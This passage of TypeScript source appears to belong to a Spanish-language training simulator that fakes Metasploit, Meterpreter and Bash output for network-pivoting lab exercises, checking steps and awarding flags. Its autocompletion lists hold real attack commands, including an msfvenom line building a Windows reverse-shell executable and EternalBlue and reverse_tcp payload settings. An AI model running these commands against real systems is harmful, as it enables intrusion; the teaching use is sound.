      else if (activeMod.includes('ms17_010_eternalblue') && scenario.id === 'windows-eternalblue-arp' && (nextTab.moduleOptions['RPORT'] === '5000' || nextTab.moduleOptions['LOCAL_PORT'] === '5000')) {
        const lport = nextTab.moduleOptions['LPORT'] || '4444';
        if (lport === '4444') {
          lines.push(
            createLine('error', `[-] Handler failed to bind to ${KALI_IP}:4444 (Address already in use by Session 1)`),
            createLine('warning', `[!] REGLA CRUCIAL: Debes cambiar LPORT (ej. set LPORT 5555) para evitar conflicto con la primera sesión.`)
          );
        } else {
          lines.push(
            createLine('info', `[*] Connecting through tunnel 192.168.1.60:5000 (Forwarded to 10.10.10.11:445)...`),
            createLine('info', `[*] Target is Windows 7 Professional 7601 Service Pack 1 (64-bit)`),
            createLine('info', `[*] Built-in Grooming on tunnel port...`),
            createLine('success', `[+] WIN! Remote target 10.10.10.11 successfully exploited through intermediate host!`),
            createLine('info', `[*] Started reverse TCP handler on ${KALI_IP}:${lport}`),
            createLine('success', `[+] Meterpreter session 2 opened (${KALI_IP}:${lport} -> 10.10.10.11:49204) at ${new Date().toLocaleTimeString()}`),
            createLine('success', `FLAG{GHOST_PIVOT_ETERNALBLUE_DOUBLE_PIVOT_EXPLOIT_SUCCESS}`)
          );
          nextTab.context = 'meterpreter';
          nextTab.activeSessionId = 2;
          newSession = {
            id: 2,
            type: 'meterpreter',
            platform: 'windows',
            remoteIp: '10.10.10.11',
            localIp: KALI_IP,
            user: 'NT AUTHORITY\\SYSTEM',
            machineId: 'win7-target',
            openedAt: new Date().toLocaleTimeString(),
          };
          if (currentStep && currentStep.id === 'step-exploit-target-smb') {
            stepCompletedId = currentStep.id;
            compromisedMachineId = 'win7-target';
          }
        }
      } else {
        lines.push(
          createLine('info', `[*] Executing ${activeMod || 'module'}...`),
          createLine('info', `[*] Module execution finished without session payload.`)
        );
      }
    } else {
      lines.push(createLine('error', `[-] Unknown command: ${mainCommand}. Type "help" or "options".`));
    }

    return {
      updatedTab: { ...nextTab, lines },
      stepCompletedId,
      newSession,
      newRoute,
      newPortForward,
      discoveredHost,
      compromisedMachineId,
    };
  }

  // 3. CONTEXT: METERPRETER
  if (tab.context === 'meterpreter') {
    if (mainCommand === 'help' || mainCommand === '?') {
      lines.push(
        createLine(
          'info',
          'Comandos esenciales de Meterpreter:\n' +
            '  ipconfig / ifconfig            Listar interfaces y direcciones IP de la víctima\n' +
            '  sysinfo                        Información del sistema operativo y arquitectura\n' +
            '  background / bg / Ctrl+Z       Enviar sesión a segundo plano para usar msfconsole\n' +
            '  portfwd add -l <p> -p <p> -r <ip> Redirigir puerto remoto a localhost (Linux/x64)\n' +
            '  portfwd list                   Listar reglas activas de port forwarding\n' +
            '  portfwd delete -l <port>       Eliminar una regla de port forwarding\n' +
            '  getuid                         Ver usuario actual de la sesión\n' +
            '  exit                           Cerrar la sesión de Meterpreter actual'
        )
      );
    } else if (mainCommand === 'background' || mainCommand === 'bg') {
      nextTab.context = 'msf-root';
      lines.push(createLine('info', `[*] Backgrounding session ${tab.activeSessionId || 1}...`));
    } else if (mainCommand === 'exit') {
      nextTab.context = 'msf-root';
      lines.push(createLine('info', `[*] Terminating session ${tab.activeSessionId || 1}...`));
    } else if (mainCommand === 'getuid') {
      const activeSess = sessions.find((s) => s.id === tab.activeSessionId);
      lines.push(createLine('stdout', `Server username: ${activeSess ? activeSess.user : 'SYSTEM'}`));
    } else if (mainCommand === 'sysinfo') {
      const activeSess = sessions.find((s) => s.id === tab.activeSessionId);
      lines.push(
        createLine(
          'stdout',
          `Computer        : ${activeSess?.machineId || 'TARGET-MACHINE'}\n` +
            `OS              : ${activeSess?.platform === 'windows' ? 'Windows 7 SP1 (64-bit)' : 'Ubuntu 20.04.6 LTS (x86_64)'}\n` +
            `Architecture    : x64\n` +
            `System Language : en_US\n` +
            `Meterpreter     : ${activeSess?.platform || 'x64'}/meterpreter`
        )
      );
    } else if (mainCommand === 'ipconfig' || mainCommand === 'ifconfig') {
      if (scenario.id === 'windows-portproxy-zorin') {
        lines.push(
          createLine(
            'stdout',
            `Interface  1\n` +
              `============\n` +
              `Name         : Intel(R) PRO/1000 MT Desktop Adapter #1 (Puente)\n` +
              `Hardware MAC : 08:00:27:12:34:56\n` +
              `IPv4 Address : 192.168.1.50\n` +
              `IPv4 Netmask : 255.255.255.0\n\n` +
              `Interface  2\n` +
              `============\n` +
              `Name         : Intel(R) PRO/1000 MT Desktop Adapter #2 (Red NAT Interna)\n` +
              `Hardware MAC : 08:00:27:78:9a:bc\n` +
              `IPv4 Address : 10.10.10.2\n` +
              `IPv4 Netmask : 255.255.255.0`
          )
        );
        if (currentStep && currentStep.id === 'step-5-ipconfig') {
          lines.push(createLine('success', '[+] ¡Segunda interfaz descubierta en la subred aislada 10.10.10.0/24!'));
          stepCompletedId = currentStep.id;
        }
      } else if (scenario.id === 'linux-autoroute-portfwd') {
        lines.push(
          createLine(
            'stdout',
            `Interface  1\n` +
              `============\n` +
              `Name         : enp0s3 (Puente)\n` +
              `Hardware MAC : 08:00:27:3b:44:12\n` +
              `IPv4 Address : 192.168.1.45\n` +
              `IPv4 Netmask : 255.255.255.0\n\n` +
              `Interface  2\n` +
              `============\n` +
              `Name         : enp0s8 (Red NAT pingured)\n` +
              `Hardware MAC : 08:00:27:88:99:aa\n` +
              `IPv4 Address : 10.10.10.3\n` +
              `IPv4 Netmask : 255.255.255.0`
          )
        );
        if (currentStep && currentStep.id === 'step-ifconfig-meterpreter') {
          lines.push(createLine('success', '[+] ¡Interfaz interna identificada en 10.10.10.3! Red destino: 10.10.10.0/24.'));
          stepCompletedId = currentStep.id;
        }
      } else {
        lines.push(
          createLine(
            'stdout',
            `Interface  1\n` +
              `============\n` +
              `Name         : Local Area Connection (Puente)\n` +
              `IPv4 Address : 192.168.1.60\n` +
              `IPv4 Netmask : 255.255.255.0\n\n` +
              `Interface  2\n` +
              `============\n` +
              `Name         : Local Area Connection 2 (Red Interna)\n` +
              `IPv4 Address : 10.10.10.4\n` +
              `IPv4 Netmask : 255.255.255.0`
          )
        );
        if (currentStep && currentStep.id === 'step-meterpreter-ipconfig') {
          lines.push(createLine('success', '[+] ¡Segunda interfaz descubierta en 10.10.10.4!'));
          stepCompletedId = currentStep.id;
        }
      }
    } else if (mainCommand === 'portfwd') {
      const sub = tokens[1]?.toLowerCase();
      if (sub === 'add') {
        const lIndex = tokens.indexOf('-l');
        const pIndex = tokens.indexOf('-p');
        const rIndex = tokens.indexOf('-r');

        const localPort = lIndex !== -1 ? parseInt(tokens[lIndex + 1], 10) : 5000;
        const targetPort = pIndex !== -1 ? parseInt(tokens[pIndex + 1], 10) : 80;
        const remoteIp = rIndex !== -1 ? tokens[rIndex + 1] : '10.10.10.5';

        lines.push(createLine('success', `[+] Successfully created local port forward 127.0.0.1:${localPort} -> ${remoteIp}:${targetPort}`));

        newPortForward = {
          id: `pf-${Date.now()}`,
          type: 'portfwd',
          localAddress: '127.0.0.1',
          localPort,
          targetAddress: remoteIp,
          targetPort,
          viaSessionId: tab.activeSessionId,
          isActive: true,
        };

        if (currentStep && (currentStep.id === 'step-portfwd-http' || currentStep.id === 'step-portfwd-ftp')) {
          stepCompletedId = currentStep.id;
        }
      } else if (sub === 'list') {
        lines.push(
          createLine(
            'banner',
            'Active Port Forwards\n====================\n\n' +
              '   Index  Local                 Remote                Direction\n' +
              '   -----  -----                 ------                ---------'
          )
        );
        portForwards.forEach((pf, i) => {
          lines.push(createLine('stdout', `   ${i + 1}      ${pf.localAddress}:${pf.localPort}      ${pf.targetAddress}:${pf.targetPort}      Forward`));
        });
        lines.push(createLine('stdout', ''));
      } else {
        lines.push(createLine('error', '[-] Sintaxis: portfwd add -l <local_port> -p <target_port> -r <remote_ip>'));
      }
    } else if (mainCommand === 'route') {
      lines.push(
        createLine('error', `[-] Unknown Meterpreter command: route`),
        createLine('warning', `[!] Error típico: 'route add' se ejecuta en msfconsole, NO dentro de Meterpreter. Envía la sesión a segundo plano escribiendo 'background' o pulsando Ctrl+Z.`)
      );
    } else if (mainCommand === 'use' || mainCommand === 'exploit') {
      lines.push(
        createLine('error', `[-] Unknown Meterpreter command: ${mainCommand}`),
        createLine('warning', `[!] Error típico: Los módulos de Metasploit se cargan en msfconsole. Escribe 'background' para volver a msfconsole.`)
      );
    } else if (mainCommand === 'nmap') {
      lines.push(
        createLine('error', `[-] Unknown Meterpreter command: nmap`),
        createLine('warning', `[!] Nmap es una herramienta del sistema que se ejecuta desde la terminal Bash de Kali Linux.`)
      );
    } else {
      lines.push(createLine('error', `[-] Unknown Meterpreter command: ${mainCommand}. Type "help".`));
    }

    return {
      updatedTab: { ...nextTab, lines },
      stepCompletedId,
      newSession,
      newRoute,
      newPortForward,
      discoveredHost,
      compromisedMachineId,
    };
  }

  return { updatedTab: { ...nextTab, lines } };
}

export function getCompletions(currentInput: string, tab: TerminalTab): string[] {
  const input = currentInput.trimStart();
  const tokens = input.split(/\s+/);
  const lastToken = tokens[tokens.length - 1] || '';

  const BASH_COMMANDS = [
    'hostname -I',
    'ifconfig',
    'ip a',
    'msfconsole -q',
    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > virus.exe',
    'python3 -m http.server 5000',
    'ssh usuario_zorin@192.168.1.50 -p 2222',
    'curl http://127.0.0.1:5000',
    'ftp 127.0.0.1 4000',
    'ping -c 2 10.10.10.5',
    'nmap -p 2222 192.168.1.50',
    'nmap -p 5000 127.0.0.1',
    'nmap -p 4000,5000 127.0.0.1',
    'nmap -p 5000 192.168.1.60',
    'nmap 192.168.1.50',
    'clear',
    'help',
  ];

  const MSF_MODULES = [
    'exploit/multi/handler',
    'post/windows/manage/portproxy',
    'post/multi/manage/autoroute',
    'post/windows/gather/arp_scanner',
    'exploit/windows/smb/ms17_010_eternalblue',
  ];

  const MSF_SETTINGS = [
    'PAYLOAD windows/meterpreter/reverse_tcp',
    'PAYLOAD linux/x64/meterpreter/reverse_tcp',
    'LHOST 192.168.1.100',
    'LPORT 4444',
    'LPORT 5555',
    'RHOSTS 192.168.1.50',
    'RHOSTS 192.168.1.60',
    'RHOSTS 10.10.10.0/24',
    'RPORT 5000',
    'RPORT 445',
    'CONNECT_ADDRESS 10.10.10.15',
    'CONNECT_ADDRESS 10.10.10.11',
    'CONNECT_PORT 22',
    'CONNECT_PORT 445',
    'LOCAL_ADDRESS 0.0.0.0',
    'LOCAL_PORT 2222',
    'LOCAL_PORT 5000',
    'SESSION 1',
    'SESSION 2',
    'SESSION 4',
  ];

  const METERPRETER_COMMANDS = [
    'ipconfig',
    'ifconfig',
    'sysinfo',
    'background',
    'portfwd add -l 5000 -p 80 -r 10.10.10.5',
    'portfwd add -l 4000 -p 21 -r 10.10.10.5',
    'portfwd list',
    'getuid',
    'help',
    'exit',
  ];

  if (tab.context === 'bash') {
    return BASH_COMMANDS.filter((c) => c.toLowerCase().startsWith(input.toLowerCase()));
  }

  if (tab.context === 'msf-root' || tab.context === 'msf-module') {
    if (tokens[0] === 'use') {
      return MSF_MODULES.filter((m) => m.toLowerCase().startsWith(lastToken.toLowerCase())).map((m) => `use ${m}`);
    }
    if (tokens[0] === 'set') {
      return MSF_SETTINGS.filter((s) => s.toLowerCase().startsWith(tokens.slice(1).join(' ').toLowerCase())).map((s) => `set ${s}`);
    }
    const msfBase = ['use ', 'set ', 'show options', 'options', 'run', 'exploit', 'sessions -l', 'sessions -i ', 'route add ', 'route print', 'back', 'help', 'exit'];
    return msfBase.filter((c) => c.toLowerCase().startsWith(input.toLowerCase()));
  }

  if (tab.context === 'meterpreter') {
    return METERPRETER_COMMANDS.filter((c) => c.toLowerCase().startsWith(input.toLowerCase()));
  }

  return [];
}
